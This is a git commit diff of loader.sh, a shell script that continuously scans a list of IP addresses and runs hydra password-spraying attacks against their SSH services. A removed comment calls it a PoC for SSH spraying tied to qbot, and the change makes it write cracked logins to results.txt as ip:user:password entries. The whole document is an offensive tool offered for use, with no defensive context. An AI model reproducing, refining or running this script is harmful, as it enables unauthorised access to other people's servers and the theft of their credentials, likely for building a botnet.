ba3462f7212d49b029e5fbc5d2105bf8e9022c58
Eyezik <eyezikbra@gmail.com>
2026-03-24 23:14:42 -0500

    Update loader.sh

--- loader.sh
+++ loader.sh
@@ -1,14 +1,15 @@
-#PoC for ssh spraying on qbot or something
 while true; do
     python3 emap-ssh.py 22 120 ips.txt 4
 
     while read -r ip; do
-        [ -z "$ip" ] && continue   # skip empty lines
+        [ -z "$ip" ] && continue
 
         echo "[*] Attacking $ip"
-        #if you can get ncrack to work itd be a lot better
-        #ncrack -vv -U users.txt -P passwords.txt $ip:22 -oA "output_$ip"
-        hydra -L users.txt -P passwords.txt ssh://$ip -t 4 -f -o results.txt -I
+
+        hydra -L users.txt -P passwords.txt ssh://"$ip" -t 4 -f -I 2>/dev/null \
+        | grep "login:" \
+        | awk -v ip="$ip" '{print ip ":" $5 ":" $7}' \
+        >> results.txt
 
     done < ips.txt
 
